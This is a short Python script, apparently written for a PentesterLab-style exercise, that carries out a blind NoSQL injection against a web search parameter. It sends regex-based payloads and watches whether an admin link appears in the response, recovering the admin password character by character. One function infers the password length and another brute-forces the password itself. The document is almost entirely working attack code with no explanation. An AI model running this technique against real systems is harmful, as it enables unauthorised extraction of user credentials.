#scripts to get a user' s password using regex
import requests
url='http://ptl-ef4fbb7d-0d7a9aee.libcurl.st/?search='
cara='1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMQWERTYUIOPASDFGHJKLZXCVBNM,./|}{-_;'
Length= len(cara)
#function to get the length of the password
def guess_the_len(pattern):
    injection = "admin%27%20%26%26%20this.password%26%26%20this.password.match(/^{}*$/)%00".format(pattern);
    conn = requests.get(url + injection)
    page_retour = conn.content.decode("utf-8")
    if '<a href="?search=admin">admin</a>' in page_retour:
        pattern+="."
        guess_the_len(pattern)

    else:
        print(len(pattern))

#brute force the password
def guess_the_pass(password):

    for c in range(0, len(cara)):
        pattern=cara[c]
        injection="admin%27%20%26%26%20this.password%26%26%20this.password.match(/^{}.*$/)%00".format(password+pattern);
       # print(password+pattern)
        conn = requests.get(url+injection)
        page_retour= conn.content.decode("utf-8")
        if len(password)==36:
            print(password)
            break
        elif '<a href="?search=admin">admin</a>'  in page_retour:# you can customize you response
            #print(password+pattern, end= " good ")
            #print("\n")
            password+=pattern

            guess_the_pass(password)
        else:
            continue



#guess_the_len(".")
guess_the_pass("")
